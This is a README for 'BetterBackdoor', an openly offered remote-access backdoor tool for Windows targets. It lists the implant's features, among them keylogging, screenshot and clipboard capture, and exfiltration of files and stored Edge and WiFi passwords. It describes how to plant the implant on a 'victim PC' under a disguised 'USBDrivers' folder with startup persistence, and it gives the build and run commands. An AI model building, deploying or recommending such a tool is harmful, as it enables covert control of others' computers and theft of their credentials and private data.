# BetterBackdoor
A backdoor is a program run on a machine that is used to remotely gain access and controll to that machine.

Typically, backdoor utilities such as Netcat have 2 main functions, to pipe remote input into cmd or bash, and output the response.
This is useful, but it is also limited.
BetterBackdoor overcomes these limitations by including the ability to inject keystrokes, get screenshots, transfer files, and many other tasks.

## Features
BetterBackdoor can create and controll a backdoor.

This backdoor can:
- Run Command Prompt commands
- Run PowerShell scripts
- Run DuckyScripts to inject keystrokes
- Exfiltrate files based on extension
- Exfiltrate Microsoft Edge and WiFi passwords
- Send and receive files to and from victim's computer
- Start a KeyLogger
- Get a screenshot of victim's computer
- Get text copied to victim's clipboard
- Get data from a victim's file (cat)

To create the backdoor, BetterBackdoor:
- Copies the necessary jar files to a new directory called 'backdoor'.
- If desired, copies a Java Runtime Environment to 'backdoor'.
- Creates batch files in 'backdoor' for running the jar files in a packaged Java Runtime Environment and supplying jar files with the server's IPv4 address.
- Copies all '.duck' DuckyScripts and '.ps1' PowerShell scripts to 'backdoor'.

To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC and execute either run.bat or install.bat.

run.bat will:
- Start the backdoor

install.bat will:
- Install the backdoor to 'C:\ProgramData\USBDrivers'
- Add the backdoor to startup (if executed as administrator)
- Run the backdoor

Once running, to control the backdoor you must return to BetterBackdoor and run option 1 at start while connected to the same WiFi network as the victim's computer.

## Requirements
- A Java JDK distribution must be installed and added to PATH.
- You must use the same computer to create and control the backdoor.
  - The computer used to create the backdoor must be on the same WiFi network as the victim's computer.
  - The IPv4 address of this computer must remain static in the time between creating the backdoor and controlling it.
- The computer used to control the backdoor must have their firewall deactivated and must run BetterBackdoor as 'sudo' (if run on Mac or Linux).

## Compatibility
BetterBackdoor is compatible with Windows and Linux, while the backdoor is only compatible with Windows.

## Installation
```
# clone BetterBackdoor
git clone https://github.com/ThatcherDev/BetterBackdoor.git

# change the working directory to BetterBackdoor
cd BetterBackdoor

# build BetterBackdoor with Maven
# for Linux run
chmod +x mvnw
./mvnw clean package

# for Windows run
mvnw.cmd clean package
```

## Usage
```
# run BetterBackdoor
java -jar BetterBackdoor.jar
```

## License
- [MIT](https://choosealicense.com/licenses/mit/)
- Copyright 2019© ThatcherDev.
